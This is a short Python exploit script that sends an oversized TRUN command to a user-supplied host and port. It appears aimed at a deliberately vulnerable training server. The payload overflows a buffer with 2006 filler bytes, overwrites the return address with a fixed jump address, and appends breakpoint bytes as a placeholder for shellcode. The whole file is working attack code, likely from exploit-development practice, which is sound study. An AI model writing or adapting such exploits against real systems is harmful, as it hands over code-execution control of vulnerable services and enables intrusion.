#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'TRUN' + ' .' + 'A'*2006
ret = '\xAF\x11\x50\x62'
payload = '\xCC'*(2500-2006-4)
# Badchars: \x00 

total = filler + ret + payload + '\n'

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address
	print(client.recv(1024))	
	print("Sending buffer..")
	client.send(total.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
